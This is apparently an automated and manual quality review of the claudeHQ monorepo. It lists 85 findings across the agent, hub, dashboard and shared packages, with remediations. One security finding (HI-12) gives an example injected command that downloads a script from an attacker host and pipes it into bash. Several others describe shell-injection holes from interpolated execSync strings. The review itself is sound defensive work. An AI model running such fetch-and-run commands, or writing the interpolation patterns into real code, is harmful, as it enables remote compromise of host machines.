---
date: 2026-03-16
status: fail
scope: full-codebase
reviewers: 5-pillar (architecture, performance, security, maintainability, robustness)
automated_checks: type-check, lint, test, build
prior_review: docs/roadmap/CODEBASE_REVIEW_2026-03-16.md
---

# Codebase Quality Review #2 — 2026-03-16

## Summary

Second comprehensive quality review of the full claudeHQ monorepo following the first review (51 findings, all fixed). Automated checks all pass. Deep 5-pillar manual review across all 4 packages uncovered **1 critical**, **13 high**, **39 medium**, **27 low**, and **5 info** findings — **85 total** new issues not covered by the prior review.

**Verdict: FAIL** — 1 critical + 13 high issues (5 are security-critical shell injection/credential exposure in the agent package) must be resolved before production deployment.

## Automated Checks

| Check | Status | Details |
|-------|--------|---------|
| Type Check (shared) | PASS | |
| Type Check (hub) | PASS | |
| Type Check (agent) | PASS | |
| Type Check (dashboard) | PASS | |
| ESLint | PASS | 0 errors, 8 warnings (console.log in CLI + composable) |
| Vitest | PASS | 36/36 passing across 4 test files |
| Build (shared/hub/agent) | PASS | |
| Build (dashboard/Nuxt) | PASS | |

## Metrics

- Source files reviewed: 73+
- Packages: 4 (agent, hub, dashboard, shared)
- Review findings: 1 critical, 13 high, 39 medium, 27 low, 5 info
- Test coverage: 36 tests passing (no coverage % configured)

---

## Critical Findings

### CR-01: Dashboard `NewSessionModal` double `res.json()` — session creation error handling broken
- **Severity:** Critical
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/components/session/NewSessionModal.vue:38-43`
- **Category:** HTTP response body consumed twice
- **Description:** `submit()` reads `res.json()` in the error branch and again in the success branch. HTTP Response body is a single-read stream. On any error path (4xx/5xx), if the server returns a non-JSON error body, `JSON.parse` throws a `SyntaxError` that completely masks the real error.
- **Impact:** Session creation errors display as confusing parse errors. The root cause is invisible to users.
- **Remediation:** Read body once: `const data = await res.json(); if (!res.ok) throw new Error(data.error ?? \`HTTP ${res.status}\`);`

---

## High Findings

### HI-01: Approval/workforce protocol messages excluded from discriminatedUnion schemas
- **Severity:** High
- **Pillar:** Architecture
- **File:** `packages/shared/src/approvals.ts:97-133`, `packages/shared/src/protocol.ts:66-196`
- **Category:** Protocol completeness
- **Description:** 5 approval message schemas and 13 workforce message schemas are defined and exported but never added to `agentToHubSchema`, `hubToAgentSchema`, or `hubToDashboardSchema`. Any code using `schema.parse()` will throw ZodError on these messages.
- **Impact:** Approval/workforce messages bypass the unified validation pipeline entirely, or Zod parse throws on legitimate messages.
- **Remediation:** Add all approval and workforce message schemas to their respective discriminated unions.

### HI-02: No "browser" condition in shared package.json exports — dashboard bundles Node.js code
- **Severity:** High
- **Pillar:** Architecture
- **File:** `packages/shared/package.json:8-17`
- **Category:** Bundle configuration
- **Description:** The exports map has no `"browser"` condition on the `"."` entry. Vite resolves `@chq/shared` to `dist/index.js` (Node.js build containing `node:fs` via config.ts).
- **Impact:** `process` and `fs` APIs land in the browser bundle. Potential build/runtime failures.
- **Remediation:** Add browser condition: `".": { "browser": "./dist/browser.js", "import": "./dist/index.js" }`.

### HI-03: Approval message schemas missing from `browser.ts` entrypoint
- **Severity:** High
- **Pillar:** Architecture
- **File:** `packages/shared/src/browser.ts:32-43`
- **Category:** Export boundaries
- **Description:** Dashboard needs `approvalRequestedMsg`, `approvalResolvedMsg`, `approvalCountMsg` to parse WebSocket messages. These are absent from `browser.ts`. Dashboard must import from root `@chq/shared` which pulls in Node.js-only code.
- **Impact:** Dashboard imports Node.js APIs into browser, or approval WebSocket messages can't be validated.
- **Remediation:** Export all 5 approval message schemas from `browser.ts`.

### HI-04: Session replay terminal never initializes — container behind `v-else` during async load
- **Severity:** High
- **Pillar:** Architecture
- **File:** `packages/dashboard/app/pages/sessions/[id]/replay.vue:51-52`
- **Category:** Vue lifecycle timing
- **Description:** `containerRef` is bound to a `<div>` inside `v-else` (rendered when `!replay.loading`). `useTerminal(containerRef)` runs `onMounted(() => init())`. At mount time, `replay.loading` is `true`, so the container doesn't exist. Terminal is never created.
- **Impact:** The entire session replay feature silently produces a blank screen.
- **Remediation:** Render container unconditionally (use `v-show` for loader overlay). Or watch `replay.loading` and call `init()` when it transitions to false.

### HI-05: Connection status hardcoded "Connected" — never reflects real WebSocket state
- **Severity:** High
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/layouts/default.vue:60-62`
- **Category:** Stale UI state
- **Description:** `<v-chip color="success">Connected</v-chip>` is unconditional. When WebSocket disconnects, the indicator stays green. Users approve requests based on data they believe is live.
- **Impact:** Critical decisions made on stale data. Particularly dangerous for the approval workflow.
- **Remediation:** Bind chip to `useWebSocket().state`.

### HI-06: `fetchStatus()` in GitHub settings — no error handling, page freezes on failure
- **Severity:** High
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/pages/settings/github.vue:16-23`
- **Category:** Missing try/catch
- **Description:** No try/catch, no `res.ok` check. On network failure, `loading` stays `true` permanently. Page frozen in skeleton-loader state.
- **Impact:** Any network error permanently freezes the GitHub settings page.
- **Remediation:** Add try/catch, error ref, `<v-alert>` with retry.

### HI-07: `fetchHealth()` in `MachineHealth.vue` — no `res.ok` check, silent data corruption
- **Severity:** High
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/components/machine/MachineHealth.vue:17-25`
- **Category:** Missing HTTP status check
- **Description:** `res.json()` called unconditionally regardless of HTTP status. Error JSON body cast to `HealthPoint[]`. `sparklineValues()` returns arrays of `undefined`.
- **Impact:** Health charts render garbage data after server errors with no indication.
- **Remediation:** Add `if (!res.ok) throw new Error(...)`. Add error ref and alert.

### HI-08: `TerminalView` does not clear terminal when `sessionId` prop changes (dashboard)
- **Severity:** High
- **Pillar:** Architecture
- **File:** `packages/dashboard/app/components/terminal/TerminalView.vue:36-39`
- **Category:** xterm.js lifecycle
- **Description:** The `watch` on `props.sessionId` updates WebSocket subscriptions but doesn't clear the terminal buffer. When component is reused, output from previous session bleeds into the new one.
- **Impact:** Sensitive terminal content from a previous session visible alongside new session output.
- **Remediation:** Call `terminal.value?.clear()` inside the watch handler.

### HI-09: Unvalidated JSON deserialization of persisted queue file (agent)
- **Severity:** High
- **Pillar:** Security
- **File:** `packages/agent/src/queue.ts:86`
- **Category:** Deserialization without validation
- **Description:** `TaskQueue.load()` calls `JSON.parse(data) as QueuedTask[]` with a bare type assertion. Any process that can write to the persist file can inject arbitrary task objects forwarded directly to `PtyPool.spawn()`.
- **Impact:** Malicious queue file leads to session spawn with attacker-controlled `cwd`, `flags`, or `prompt`. Privilege escalation if file is world-writable.
- **Remediation:** Add a Zod schema for `QueuedTask` and use `.parse()` before assigning.

### HI-10: `agentToken` exposed in WebSocket URL — visible in logs and proxies (agent)
- **Severity:** High
- **Pillar:** Security
- **File:** `packages/agent/src/ws-client.ts:46-47`
- **Category:** Credential exposure
- **Description:** Agent auth token appended as query string `?token=...`. Query strings are captured in proxy logs, access logs, and HTTP debuggers.
- **Impact:** Token leakage allows any machine to impersonate the agent to the Hub.
- **Remediation:** Use WebSocket `headers` option: `new WebSocket(url, { headers: { Authorization: \`Bearer ${token}\` } })`.

### HI-11: `execSync` shell injection via workspace path in provisioner (agent)
- **Severity:** High
- **Pillar:** Security
- **File:** `packages/agent/src/workspace-provisioner.ts:64,93`
- **Category:** Shell injection
- **Description:** `execSync(\`du -sb "${workspacePath}"\`)` — path with embedded double-quotes breaks out of quoting for shell injection. `workspacePath` derives from Hub messages.
- **Impact:** Remote code execution on host machine.
- **Remediation:** Replace with `execFileSync('du', ['-sb', workspacePath])`. For file reads, use `readFileSync` directly.

### HI-12: `workspace-provisioner.ts` runs arbitrary `setupCommands` via shell on the host (agent)
- **Severity:** High
- **Pillar:** Security
- **File:** `packages/agent/src/workspace-provisioner.ts:51-58`
- **Category:** Command injection
- **Description:** Every string in `opts.setupCommands` runs via `execSync(cmd)` (a shell invocation) without allowlist validation. Unlike `container-setup.ts` which validates against `ALLOWED_SETUP_PREFIXES`.
- **Impact:** Hub message supplying `setupCommands: ["curl attacker.com/backdoor | bash"]` results in direct host compromise.
- **Remediation:** Apply same `isAllowedCommand` allowlist from `container-setup.ts` or use `execFileSync` with parsed args.

### HI-13: SSH remote command string — unquoted `cwd` injection (agent)
- **Severity:** High
- **Pillar:** Security
- **File:** `packages/agent/src/spawn-ssh.ts:37`
- **Category:** Command injection
- **Description:** `cd ${cwd}` is unquoted in the remote command string. Shell metacharacters in `cwd` achieve arbitrary command execution on the SSH target.
- **Impact:** Attacker-controlled `cwd` can inject arbitrary commands on the remote SSH target.
- **Remediation:** Quote `cwd` properly. Better: restructure to pass arguments individually without shell interpolation.

---

## Medium Findings

### ME-01: `approvalPolicyRuleSchema` uses `z.string()` for enum-constrained fields
- **Severity:** Medium
- **Pillar:** Security
- **File:** `packages/shared/src/approvals.ts:83,88`
- **Category:** Overly permissive schema
- **Description:** `match_request_type` and `match_risk_level` are `z.array(z.string())` instead of `z.array(approvalRequestTypeSchema)` / `z.array(riskLevelSchema)`. Wrong-cased values silently pass validation.
- **Impact:** Malformed policy rules silently match nothing — security gap where auto-deny rules never fire.
- **Remediation:** Use the specific enum schemas.

### ME-02: `loadConfig` silently swallows all file errors including permission denied
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/shared/src/config.ts:39-44`
- **Category:** Silent failure
- **Description:** Catch block covers all errors including EACCES and JSON syntax errors. Corrupt config files indistinguishable from missing ones.
- **Impact:** Service silently starts with wrong settings.
- **Remediation:** Narrow catch to `ENOENT` only; rethrow others.

### ME-03: `loadConfig` env-var overlay has no boolean coercion
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/shared/src/config.ts:56-57`
- **Category:** Type coercion
- **Description:** Numeric strings are coerced but boolean strings (`"true"`, `"false"`) are not. Zod `z.boolean()` rejects strings.
- **Impact:** Boolean config via env vars causes ZodError at startup.
- **Remediation:** Add boolean coercion before numeric check.

### ME-04: `hubSessionInputSchema.input` has no maximum length constraint
- **Severity:** Medium
- **Pillar:** Security
- **File:** `packages/shared/src/protocol.ts:102-106`
- **Category:** Unbounded input
- **Description:** `input: z.string()` with no `.max()`. Written directly to PTY.
- **Impact:** Memory exhaustion via single large WebSocket message.
- **Remediation:** Add `.max(65536)`.

### ME-05: `agentRecordingUploadSchema` chunks array is unbounded
- **Severity:** Medium
- **Pillar:** Performance
- **File:** `packages/shared/src/protocol.ts:53-58`
- **Category:** Unbounded array
- **Description:** No `.max()` on chunks array or individual chunk data strings.
- **Impact:** OOM on hub during recording ingestion.
- **Remediation:** Add `.max(1000)` to array and `.max(65536)` to chunk data.

### ME-06: `tool_input` and `terminal_context` are unbounded, may contain secrets
- **Severity:** Medium
- **Pillar:** Security
- **File:** `packages/shared/src/approvals.ts:43,46`
- **Category:** Sensitive data
- **Description:** Stored in DB and transmitted to dashboard without redaction. May contain API keys from bash commands.
- **Impact:** Secrets in tool arguments stored verbatim and sent to all dashboard clients.
- **Remediation:** Add `.max(10_000)`, flag as sensitive, coordinate with scrub pipeline.

### ME-07: `agentApprovalRequestMsg` omits `risk_level` — protocol gap
- **Severity:** Medium
- **Pillar:** Architecture
- **File:** `packages/shared/src/approvals.ts:97-107`
- **Category:** Protocol inconsistency
- **Description:** Agent message doesn't include risk_level but the stored record requires it. No documentation on who classifies risk.
- **Impact:** Risk classification logic implicitly hub-side with no schema contract.
- **Remediation:** Add `riskLevel` to agent message, or document the hub-side inference explicitly.

### ME-08: `resourceTypeSchema` not exported — callers duplicate the enum
- **Severity:** Medium
- **Pillar:** Architecture
- **File:** `packages/shared/src/protocol.ts:178`
- **Category:** Export boundaries
- **Description:** Declared without `export`. Hub/dashboard must redefine locally.
- **Impact:** Drift risk when new resource types are added.
- **Remediation:** Export and re-export from index.ts/browser.ts.

### ME-09: `scheduledTaskRoutes` uses inline `db.prepare()` in all handlers
- **Severity:** Medium
- **Pillar:** Performance
- **File:** `packages/hub/src/routes/scheduled-tasks.ts:9,13,38,43,47,53,57,60,64`
- **Category:** SQLite statement compilation in hot paths
- **Description:** 9 inline `db.prepare()` calls recompile SQL on every request. Other routes (github, jobs, costs) correctly hoist to plugin scope.
- **Impact:** CPU overhead under load for scheduled task management.
- **Remediation:** Hoist all to plugin scope like other route files.

### ME-10: `approvalRoutes` list endpoint uses inline `db.prepare()` with dynamic SQL
- **Severity:** Medium
- **Pillar:** Performance
- **File:** `packages/hub/src/routes/approvals.ts:143-157`
- **Category:** SQLite hot path
- **Description:** Same dynamic SQL pattern as the fixed `listSessions` in DAL. Recompiles on every request.
- **Impact:** Measurable overhead on approval list queries.
- **Remediation:** Pre-prepare a statement matrix or use keyed cache.

### ME-11: `jobRoutes` list endpoint uses inline `db.prepare()` with dynamic SQL
- **Severity:** Medium
- **Pillar:** Performance
- **File:** `packages/hub/src/routes/jobs.ts:34-39`
- **Category:** SQLite hot path
- **Description:** Same pattern — `db.prepare(sql).all(...)` inline.
- **Remediation:** Pre-prepare variants.

### ME-12: `NotificationEngine.dispatch()` uses inline `db.prepare()` twice
- **Severity:** Medium
- **Pillar:** Performance
- **File:** `packages/hub/src/notifications.ts:22-24,43-47`
- **Category:** SQLite hot path
- **Description:** Config lookup and notification insert both use inline `db.prepare()`.
- **Remediation:** Hoist to constructor, matching the pattern in `GitHubClient`.

### ME-13: `server.ts:44` — `recordingsPath` stored via unsafe type cast on Fastify instance
- **Severity:** Medium
- **Pillar:** Architecture
- **File:** `packages/hub/src/server.ts:44`
- **Category:** Type safety
- **Description:** `(app as unknown as Record<string, unknown>).recordingsPath = config.recordingsPath` bypasses TypeScript. Retrieved with matching unsafe cast in sessions route.
- **Impact:** No compile-time safety; refactoring can silently break the value propagation.
- **Remediation:** Use `app.decorate('recordingsPath', config.recordingsPath)` with a `declare module 'fastify'` augmentation (same pattern as health.ts:4-14).

### ME-14: Malformed JSONL in replay causes runaway setTimeout loop — browser tab lockup
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/composables/useReplay.ts:27-41`
- **Category:** Missing data validation
- **Description:** If a line is valid JSON but has `ts: undefined`, `setTimeout(fn, NaN)` fires immediately in a tight loop.
- **Impact:** Single malformed recording line locks browser tab at 100% CPU.
- **Remediation:** Add structural validation; guard `if (!Number.isFinite(delta))`.

### ME-15: Approval respond errors silently swallowed
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/pages/approvals/index.vue:26-28`
- **Category:** Unhandled async error
- **Description:** `store.respond()` throws on non-OK response. No try/catch. Users believe approval succeeded.
- **Impact:** Silent approval failures. Claude processes remain blocked.
- **Remediation:** Wrap in try/catch, show snackbar with failure reason.

### ME-16: Jobs and PRs pages — no try/catch and no `res.ok` check
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/pages/jobs/index.vue:12-17`, `pages/prs/index.vue:27-32`
- **Category:** Missing error handling
- **Description:** Both pages fetch in `onMounted` with no error handling. Loading stuck or garbage data on failure.
- **Impact:** Pages freeze or show wrong data with no feedback.
- **Remediation:** Add error ref, try/catch, res.ok check, and error alert.

### ME-17: Repos and Scheduled Tasks pages — no error handling on fetch + write operations
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/pages/repos/index.vue:15-34`, `pages/scheduled-tasks/index.vue:30-71`
- **Category:** Missing error handling
- **Description:** All read and write operations have no try/catch. Failed task creation silently closes dialog.
- **Impact:** Silent failures on all write operations. Users can't distinguish success from failure.
- **Remediation:** Add try/catch to all async functions, check res.ok.

### ME-18: Queue page optimistic reorder not rolled back on server failure
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/pages/queues/index.vue:49-70`
- **Category:** Optimistic update without rollback
- **Description:** Local state updated before server call. No try/catch on PATCH request.
- **Impact:** Queue ordering diverges silently between UI and server.
- **Remediation:** Add try/catch, re-fetch in catch block.

### ME-19: `MachineHealth.vue` — race condition on rapid time-range changes
- **Severity:** Medium
- **Pillar:** Performance
- **File:** `packages/dashboard/app/components/machine/MachineHealth.vue:28`
- **Category:** Race condition
- **Description:** No AbortController. Rapid clicks create concurrent requests; last to resolve wins, may be wrong range.
- **Impact:** Health charts show data for wrong time range.
- **Remediation:** Store AbortController ref, cancel at start of each fetch.

### ME-20: `NewSessionModal` — `machineId` stale when prop changes
- **Severity:** Medium
- **Pillar:** Architecture
- **File:** `packages/dashboard/app/components/session/NewSessionModal.vue:16`
- **Category:** Stale prop binding
- **Description:** `ref(props.defaultMachineId)` captures initial value. Prop changes don't update the select.
- **Impact:** Sessions created on wrong machine when navigating without unmount.
- **Remediation:** Add a watcher on the prop.

### ME-21: 4 simultaneous xterm.js WebGL contexts in grid view — GPU exhaustion
- **Severity:** Medium
- **Pillar:** Performance
- **File:** `packages/dashboard/app/pages/sessions/grid.vue:57-79`
- **Category:** Unbounded resource creation
- **Description:** 4 terminals with 10K scrollback + WebGL + ResizeObserver + WebSocket. Browsers limit WebGL contexts to ~8-16.
- **Impact:** Degraded performance, silent fallback to DOM rendering.
- **Remediation:** In readonly mode, reduce scrollback to ~500 and skip WebGL.

### ME-22: `useNotifications` — handler accumulates on re-mount, duplicating notifications
- **Severity:** Medium
- **Pillar:** Architecture
- **File:** `packages/dashboard/app/composables/useNotifications.ts:21-51`
- **Category:** Handler accumulation
- **Description:** Each mount registers new handler; `cleanup` ref overwritten. N handlers accumulate.
- **Impact:** Notifications appear N times after re-mounts.
- **Remediation:** Call teardown() before re-registering in init().

### ME-23: Approval policies — no `res.ok` check; no delete confirmation; `JSON.parse` in template
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/pages/settings/approval-policies.vue:11-58`
- **Category:** Multiple issues
- **Description:** (1) No res.ok check on fetch. (2) No confirmation on delete. (3) `JSON.parse(value)` inline in template slot — throws SyntaxError in render on malformed data.
- **Impact:** One misclick permanently deletes policy. Malformed DB entry breaks the table.
- **Remediation:** Add res.ok check, confirmation dialog, and move JSON.parse to a script helper with try/catch.

### ME-24: GitHub settings — PAT cleared on failure, no success/error feedback
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/pages/settings/github.vue:25-36`
- **Category:** Missing feedback
- **Description:** No try/catch, no res.ok check. `patToken.value = ''` runs unconditionally.
- **Impact:** Users lose pasted PAT on failure with no indication.
- **Remediation:** Only clear on success. Add try/catch and snackbar.

### ME-25: Costs page — `Promise.all` with no try/catch; page frozen on error
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/pages/costs/index.vue:21-34`
- **Category:** Missing error handling
- **Description:** `Promise.all` in onMounted, no try/catch, no finally. loading.value = false never set on error.
- **Impact:** Costs page permanently frozen on any backend error.
- **Remediation:** Add try/catch with finally.

### ME-26: Workspaces page — feature not implemented, dead code, misleading nav item
- **Severity:** Medium
- **Pillar:** Maintainability
- **File:** `packages/dashboard/app/pages/workspaces/index.vue:10-15`
- **Category:** Dead code
- **Description:** onMounted sets loading true then immediately false. No API call. statusColor defined but unused. Nav item leads to empty page.
- **Impact:** Misleading navigation. Dead code confuses maintainers.
- **Remediation:** Implement or remove nav item until ready.

### ME-27: `sessions/[id].vue` — kill/resume missing error handling
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/pages/sessions/[id].vue:38-65`
- **Category:** Silent failures
- **Description:** killSession has no res.ok check. resumeSession failure branch absent.
- **Impact:** Failed kill appears to succeed. Failed resume loses user's prompt.
- **Remediation:** Add try/catch and error feedback.

### ME-28: `WorkspaceStatus` and `JobStatus` TypeScript types never exported
- **Severity:** Medium
- **Pillar:** Architecture
- **File:** `packages/shared/src/workforce.ts:28-54`
- **Category:** Type completeness
- **Description:** Schemas exported but no companion types, unlike every other status schema.
- **Impact:** Callers fall back to `string`, eroding type safety.
- **Remediation:** Add `export type WorkspaceStatus = z.infer<typeof workspaceStatusSchema>`.

### ME-29: Bulk approve in approvals route not wrapped in transaction
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/hub/src/routes/approvals.ts:211-222`
- **Category:** Data integrity
- **Description:** `for (const id of body.approvalIds)` runs individual `resolveApprovalStmt.run()` calls. If one fails mid-loop, partial approvals are committed.
- **Impact:** Inconsistent bulk approval state on error.
- **Remediation:** Wrap the loop in `db.transaction()`.

### ME-30: `repoRoutes` PUT uses dynamic SQL with `db.prepare()` inside handler
- **Severity:** Medium
- **Pillar:** Performance
- **File:** `packages/hub/src/routes/repos.ts:100-103`
- **Category:** SQLite hot path
- **Description:** `db.prepare(\`UPDATE repos SET ${sets.join(', ')} WHERE id = ?\`)` compiles a new statement on every PUT request.
- **Impact:** CPU overhead, though mitigated by whitelist preventing injection.
- **Remediation:** Pre-prepare per-field update statements or accept full replacement.

### ME-31: `commitAndPush` uses `git add -A` — may commit secrets or unintended files
- **Severity:** Medium
- **Pillar:** Security
- **File:** `packages/agent/src/container-worktree.ts:74`
- **Category:** Unintended file inclusion
- **Description:** `git add -A` stages everything in the worktree. If Claude creates temporary files containing API keys or debug output, they get committed and pushed.
- **Impact:** Accidental secret exposure in pushed commits.
- **Remediation:** Use a `.gitignore` in the worktree or explicitly stage only expected paths.

### ME-33: Container CPU % calculation missing `num_cpus` normalization (agent)
- **Severity:** Medium
- **Pillar:** Performance
- **File:** `packages/agent/src/container-pool.ts:220-222`
- **Description:** `(cpuDelta / systemDelta) * 100` — not multiplied by `online_cpus`. On 16-core host, reported CPU is ~16x too small.
- **Impact:** Hub orchestrator over-provisions containers on saturated machines.
- **Remediation:** Multiply by `stats.cpu_stats.online_cpus`.

### ME-34: `sessionMeta` Map never cleared — unbounded memory growth (agent)
- **Severity:** Medium
- **Pillar:** Performance
- **File:** `packages/agent/src/daemon.ts:18,154`
- **Description:** `sessionMeta.delete(sessionId)` never called. Prompt text of every historical session remains in memory.
- **Impact:** Gradual memory leak; prompt data of all sessions in memory increases heap dump blast radius.
- **Remediation:** Delete entry in session:exit handler.

### ME-35: `Recorder.finalize()` silently drops buffered chunks when WS disconnected (agent)
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/agent/src/recorder.ts:33-41`
- **Description:** `WsClient.send()` drops messages when disconnected. No retry, no local fallback. The `final: true` marker is permanently lost.
- **Impact:** Recording permanently incomplete if WS briefly disconnects at session end.
- **Remediation:** Add fallback buffer with retry on reconnect; or return Promise from finalize.

### ME-36: `container-setup.ts` does not clean up container on exception before `container.wait()` (agent)
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/agent/src/container-setup.ts:92-134`
- **Description:** Between `container.start()` and `container.remove()`, several awaits can reject. Container left in exited-but-not-removed state.
- **Impact:** Container and resource leak on repeated failures.
- **Remediation:** Wrap in try/finally that always calls `container.remove({ force: true })`.

### ME-37: No reconnect attempt cap or circuit-breaker in `WsClient` (agent)
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/agent/src/ws-client.ts:128-139`
- **Description:** No maximum reconnect attempt limit. Misconfigured `hubUrl` causes infinite retry loop. Unhandled `wsError` events swallowed silently.
- **Impact:** Misconfigured agents silently retry forever with no alert.
- **Remediation:** Add cap (e.g., log critical after 10 failures). Attach default listener to wsError.

### ME-38: `hooks-config.ts` non-atomic file write — crash corrupts settings file (agent)
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/agent/src/hooks-config.ts:58`
- **Description:** `writeFileSync` directly to final path. Crash mid-write leaves partial JSON. Next startup overwrites with empty-hooks config, losing user's settings.
- **Impact:** Crash during daemon startup permanently erases user's `~/.claude/settings.json`.
- **Remediation:** Write to `.tmp` file first, then `renameSync` (atomic on POSIX).

### ME-39: `getDiskPercent` shell injection via `diskPath` param (agent)
- **Severity:** Medium
- **Pillar:** Security
- **File:** `packages/agent/src/health.ts:46`
- **Description:** `execSync(\`df -P "${path}"\`)` — same shell interpolation pattern as AG-03.
- **Impact:** Shell injection if diskPath is attacker-influenced.
- **Remediation:** Replace with `execFileSync('df', ['-P', path ?? '/'])`.

### ME-32: `PtyPool.killAll()` setTimeout(resolve, 10_000) creates dangling timer
- **Severity:** Medium
- **Pillar:** Robustness
- **File:** `packages/agent/src/pty-pool.ts:121`
- **Category:** Timer leak
- **Description:** The 10s fallback timeout is created but never cleared if the session exits normally before the timeout.
- **Impact:** Dangling timers accumulate during shutdown. Minor in practice since process exits.
- **Remediation:** Store timer ref and clear it when session exits.

---

## Low Findings

### LO-01: `NotificationRecord.type` and `.channel` are unconstrained strings
- **Severity:** Low
- **Pillar:** Architecture
- **File:** `packages/shared/src/types.ts:65-66`
- **Remediation:** Define enums once value set is known.

### LO-02: `QueueTask.position` lacks `int()` and `min(0)` constraints
- **Severity:** Low
- **Pillar:** Robustness
- **File:** `packages/shared/src/types.ts:56`

### LO-03: Heartbeat `cpuPercent`/`memPercent` have no `min(0).max(100)` range
- **Severity:** Low
- **Pillar:** Robustness
- **File:** `packages/shared/src/protocol.ts:27-28`

### LO-04: `agentContainerStatsMsg.pids` lacks `int()` and `min(0)`
- **Severity:** Low
- **Pillar:** Robustness
- **File:** `packages/shared/src/workforce.ts:177`

### LO-05: `cost_usd` and `max_cost_usd` lack `min(0)` constraint
- **Severity:** Low
- **Pillar:** Robustness
- **File:** `packages/shared/src/workforce.ts:69,76`

### LO-06: `sessionTemplateSchema` `timeout_seconds` and `max_cost_usd` lack `min(0)`
- **Severity:** Low
- **Pillar:** Robustness
- **File:** `packages/shared/src/templates.ts:22-23`

### LO-07: `approvalResponseSchema.rememberAsRule` has no associated rule details schema
- **Severity:** Low
- **Pillar:** Architecture
- **File:** `packages/shared/src/approvals.ts:65`

### LO-08: No protocol version field for rolling upgrade compatibility
- **Severity:** Low
- **Pillar:** Robustness
- **File:** `packages/shared/src/protocol.ts`

### LO-09: `tsup.config.ts` lacks treeshake; `package.json` lacks `"sideEffects": false`
- **Severity:** Low
- **Pillar:** Performance
- **File:** `packages/shared/tsup.config.ts`, `packages/shared/package.json`

### LO-10: `approvals.ts`, `templates.ts`, `workforce.ts` have zero test coverage
- **Severity:** Low
- **Pillar:** Maintainability
- **File:** `packages/shared/src/__tests__/`

### LO-11: `match_bash_command_pattern` and `match_file_path_pattern` not validated as legal regex
- **Severity:** Low
- **Pillar:** Robustness
- **File:** `packages/shared/src/approvals.ts:85-86`
- **Description:** Passed to `new RegExp()` at evaluation time. Invalid regex causes runtime exception during session activity.
- **Remediation:** Add Zod refinement to validate regex at creation time.

### LO-12: `loadConfig` camelCase transform undocumented and untested
- **Severity:** Low
- **Pillar:** Robustness
- **File:** `packages/shared/src/config.ts:51-54`

### LO-13: WebSocket reconnect counter not persisted to global — backoff resets on HMR
- **Severity:** Low
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/composables/useWebSocket.ts:124-136`

### LO-14: `null` as VSelect value for "All" filter may behave inconsistently
- **Severity:** Low
- **Pillar:** Architecture
- **File:** `packages/dashboard/app/pages/sessions/index.vue:80-89`

### LO-15: Wildcard Vuetify import disables tree-shaking (+300-500KB bundle)
- **Severity:** Low
- **Pillar:** Performance
- **File:** `packages/dashboard/app/plugins/vuetify.ts:2-3`
- **Remediation:** Use `vite-plugin-vuetify` with `autoImport: true`.

### LO-16: `statusColor` Record duplicated across 5 files with inconsistent coverage
- **Severity:** Low
- **Pillar:** Maintainability
- **File:** 5 pages (sessions/index, sessions/grid, sessions/[id], machines/[id], index)
- **Description:** `sessions/grid.vue` omits `blocked` and `cancelled` entries.
- **Remediation:** Extract to `composables/useSessionStatusColor.ts`.

### LO-17: `replay.dispose()` called twice on unmount
- **Severity:** Low
- **Pillar:** Robustness
- **File:** `packages/dashboard/app/pages/sessions/[id]/replay.vue:27`

### LO-18: Non-idiomatic `watch(() => hours.value, ...)` instead of `watch(hours, ...)`
- **Severity:** Low
- **Pillar:** Maintainability
- **File:** `packages/dashboard/app/components/machine/MachineHealth.vue:28`

### LO-19: `isAllowedWebhookUrl` allows HTTP for discord.com and slack.com
- **Severity:** Low
- **Pillar:** Security
- **File:** `packages/hub/src/notifications.ts:77-79`
- **Description:** HTTP is allowed (not just HTTPS) for these domains. Discord and Slack both enforce HTTPS redirects, but allowing HTTP opens a MITM window.
- **Remediation:** Require `https:` for all webhook URLs.

### LO-20: `AgentHandler.handleHeartbeat` does not call `app.recordHealthData`
- **Severity:** Low
- **Pillar:** Architecture
- **File:** `packages/hub/src/ws/agent-handler.ts:136-147`, `packages/hub/src/routes/health.ts:38-46`
- **Description:** `healthHistoryRoutes` decorates Fastify with `recordHealthData()` for health history recording. But `AgentHandler.handleHeartbeat` only calls `dal.updateMachineHeartbeat` — it never calls `recordHealthData`. Health history table is never populated.
- **Impact:** `/api/machines/:id/health` always returns empty array. MachineHealth component has no data.
- **Remediation:** Call `app.recordHealthData(msg.machineId, msg.cpuPercent, msg.memPercent, null, msg.activeSessions)` in `handleHeartbeat`.

### LO-21: `docker-compose.yml` exposes port on all interfaces by default
- **Severity:** Low
- **Pillar:** Security
- **File:** `docker-compose.yml:7`
- **Description:** `"${CHQ_HUB_PORT:-7700}:7700"` binds to 0.0.0.0. In environments without Tailscale sidecar, the entire API is exposed.
- **Remediation:** Default to `"127.0.0.1:${CHQ_HUB_PORT:-7700}:7700"`.

### LO-22: `PtyPool.spawn()` doesn't check if sessionId already exists in map
- **Severity:** Low
- **Pillar:** Robustness
- **File:** `packages/agent/src/pty-pool.ts:47-88`
- **Description:** If a caller provides a `sessionId` that's already in the sessions map, the old entry is silently overwritten.
- **Impact:** Orphaned PTY process with no reference for cleanup.
- **Remediation:** Check `if (this.sessions.has(sessionId)) throw new Error(...)`.

### LO-23: `WsClient.send()` silently drops messages when disconnected
- **Severity:** Low
- **Pillar:** Robustness
- **File:** `packages/agent/src/ws-client.ts:90-96`
- **Description:** When state is not `connected`, messages are emitted as `sendFailed` events but nobody listens. Recording upload chunks and session events are permanently lost.
- **Impact:** Recordings may have gaps if WS briefly disconnects during session.
